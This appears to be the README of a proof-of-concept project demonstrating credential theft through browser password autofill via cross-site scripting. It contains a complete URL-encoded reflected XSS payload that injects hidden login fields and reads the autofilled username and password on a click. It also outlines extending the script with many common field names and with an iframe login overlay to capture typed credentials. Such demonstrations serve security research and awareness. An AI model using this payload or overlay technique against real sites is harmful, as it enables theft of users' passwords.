# XSS Autofill

To see it in action, serve from the `/public` directory.
 
Then 'log in' on the `index.html` page. When your browser asks to save your password, allow it.

The `logged-in.html` page has a mock reflected XSS vulnerability and loads a malicious script, `xss.js`.

This script adds a username and password field to the page, which your browser will kindly autofill.

But we can't access the values in these fields without some sort of user interaction, 
so we listen for a click event on window, at which point the fields are filled and we can get the values from the inputs.

## Reflected XSS
Since the script is quite short, it will fit in a URL for reflected XSS attacks, e.g. `q=%3Cscript%3Evar%20u%3Ddocument.createElement(%22input%22)%3Bu.name%3D%22username%22%2Cu.hidden%3D!0%2Cdocument.body.appendChild(u)%3Bvar%20p%3Ddocument.createElement(%22input%22)%3Bp.name%3D%22password%22%2Cp.type%3D%22password%22%2Cp.hidden%3D!0%2Cdocument.body.appendChild(p)%2Cwindow.addEventListener(%22click%22%2C()%3D%3E%7Bconsole.log(%60%20username%3A%20%24%7Bu.value%7D%0A%20password%3A%20%24%7Bp.value%7D%60)%7D)%3B%3C%2Fscript%3E`

This script could be targeted on a per-page basis, to get the username and password input names right, or it could just contain 
many variations of common username and password input names so the browser will autofill at least some of them.

## Fallback when the fields aren't autofilled
The script could be extended to display the login page of the site in an iframe, layered over the page where the XSS payload executes.
In this instances, a click even would be registered on the submit button that captures the username/password, stops propagation, and removes the iframe.
